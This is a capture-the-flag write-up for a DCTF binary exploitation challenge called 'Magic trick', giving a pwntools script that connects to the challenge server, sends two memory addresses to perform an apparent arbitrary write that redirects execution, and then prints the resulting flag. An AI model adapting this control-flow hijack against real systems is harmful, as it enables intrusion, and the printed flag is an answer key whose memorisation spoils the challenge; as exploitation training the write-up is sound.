# Magic trick

## Description

How about a magic trick?

`nc dctf-chall-magic-trick.westeurope.azurecontainer.io 7481`

[magic_trick](magic_trick)

## Solution

```python
from pwn import *

nc = remote('dctf-chall-magic-trick.westeurope.azurecontainer.io', 7481)

nc.recvline()
nc.sendline(str(0x400667))

nc.recvline()
nc.sendline(str(0x600a00))

nc.interactive()
```

#### **FLAG >>** `dctf{1_L1k3_M4G1c}`